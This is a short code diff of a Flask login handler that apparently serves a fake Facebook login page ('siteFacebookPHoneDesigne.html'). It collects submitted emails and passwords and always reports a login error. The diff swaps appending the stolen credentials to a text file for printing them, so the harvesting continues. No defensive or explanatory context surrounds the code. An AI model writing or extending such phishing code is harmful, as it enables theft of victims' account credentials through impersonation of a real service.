@@ -12,10 +12,8 @@ def login():
     error = True
     email = request.form.get('email')
     password = request.form.get('password')
-    with open("./login_data.txt", "a") as f:
-        f.write("email: " + email + "\n")
-        f.write("password: " + password + "\n")
-        f.write("========================"+"\n")
+    print(email)
+    print(password)
     return render_template("siteFacebookPHoneDesigne.html" , error = error)
 
 # @app.route('/',methods=['GET'])
